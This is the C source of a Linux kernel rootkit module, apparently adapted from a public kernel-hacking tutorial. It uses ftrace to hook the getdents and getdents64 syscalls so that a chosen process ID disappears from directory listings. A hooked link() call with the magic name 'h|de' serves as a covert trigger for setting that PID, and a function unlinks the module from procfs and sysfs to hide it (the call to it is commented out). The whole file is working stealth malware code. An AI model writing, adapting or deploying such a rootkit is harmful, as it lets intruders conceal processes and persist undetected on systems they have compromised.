#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");

// https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.5_hiding_processes/rootkit.c

char PROCESS_PID[NAME_MAX] = "1";

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
asmlinkage int hook_getdents64(const struct pt_regs *regs) {
  struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

  long error;

  struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
  unsigned long offset = 0;

  int ret = orig_getdents64(regs);
  dirent_ker = kzalloc(ret, GFP_KERNEL);

  if ((ret <= 0) || (dirent_ker == NULL))
    return ret;

  error = copy_from_user(dirent_ker, dirent, ret);
  if (error)
    goto done;

  while (offset < ret) {
    current_dir = (void *)dirent_ker + offset;

    if ((memcmp(PROCESS_PID, current_dir->d_name, strlen(PROCESS_PID)) == 0) &&
        (strncmp(PROCESS_PID, "", NAME_MAX) != 0)) {
      if (current_dir == dirent_ker) {
        ret -= current_dir->d_reclen;
        memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
        continue;
      }
      previous_dir->d_reclen += current_dir->d_reclen;
    } else {
      previous_dir = current_dir;
    }

    offset += current_dir->d_reclen;
  }

  error = copy_to_user(dirent, dirent_ker, ret);
  if (error)
    goto done;

done:
  kfree(dirent_ker);
  return ret;
}

static asmlinkage long (*orig_getdents)(const struct pt_regs *);
asmlinkage int hook_getdents(const struct pt_regs *regs) {
  struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
  };
  struct linux_dirent *dirent = (struct linux_dirent *)regs->si;

  long error;

  struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
  unsigned long offset = 0;

  int ret = orig_getdents(regs);
  dirent_ker = kzalloc(ret, GFP_KERNEL);

  if ((ret <= 0) || (dirent_ker == NULL))
    return ret;
  error = copy_from_user(dirent_ker, dirent, ret);
  if (error)
    goto done;

  while (offset < ret) {
    current_dir = (void *)dirent_ker + offset;

    if ((memcmp(PROCESS_PID, current_dir->d_name, strlen(PROCESS_PID)) == 0) &&
        (strncmp(PROCESS_PID, "", NAME_MAX) != 0)) {
      if (current_dir == dirent_ker) {
        ret -= current_dir->d_reclen;
        memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
        continue;
      }
      previous_dir->d_reclen += current_dir->d_reclen;
    } else {

      previous_dir = current_dir;
    }

    offset += current_dir->d_reclen;
  }

  error = copy_to_user(dirent, dirent_ker, ret);
  if (error)
    goto done;

done:
  kfree(dirent_ker);
  return ret;
}

static asmlinkage long (*orig_link)(const struct pt_regs *);
asmlinkage int hook_link(const struct pt_regs *regs) {
  char oldname[NAME_MAX] = {0};
  int oldname_len =
      strncpy_from_user(oldname, (const char *)regs->di, NAME_MAX);
  char newname[NAME_MAX] = {0};
    int newname_len =
        strncpy_from_user(newname, (const char *)regs->si, NAME_MAX);

  if (oldname_len == 0) {
    goto done;
  }

  // trigger hiding by calling link("h|de","pid")
  if (oldname_len == 4 && oldname[0] == 'h' && oldname[1] == '|' &&
      oldname[2] == 'd' && oldname[3] == 'e') {

    int i;
    if (newname_len == 0) {
      goto done;
    }

    for (i = 0; i < newname_len; i++) {
      if (!(newname[i] >= '0' && newname[i] <= '9')) {
        goto done;
      }
    }

    printk(KERN_INFO "rootkit: hiding %s\n", newname);
    strcpy(PROCESS_PID, newname);
    return 1;
  }

  printk(KERN_INFO "rootkit: link %s %s\n", oldname, newname);

done:
  return orig_link(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
    HOOK("__x64_sys_link", hook_link, &orig_link),
};

void module_hide(void) {
   list_del(&THIS_MODULE->list);             //remove from procfs
   kobject_del(&THIS_MODULE->mkobj.kobj);    //remove from sysfs
   THIS_MODULE->sect_attrs = NULL;
   THIS_MODULE->notes_attrs = NULL;
   printk(KERN_INFO "rootkit: module hidden!\n");
}

static int __init rootkit_init(void) {
  int err;

//  module_hide();
  err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  if (err)
    return err;

  printk(KERN_INFO "rootkit: Loaded >:-)\n");

  return 0;
}

static void __exit rootkit_exit(void) {
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
  printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
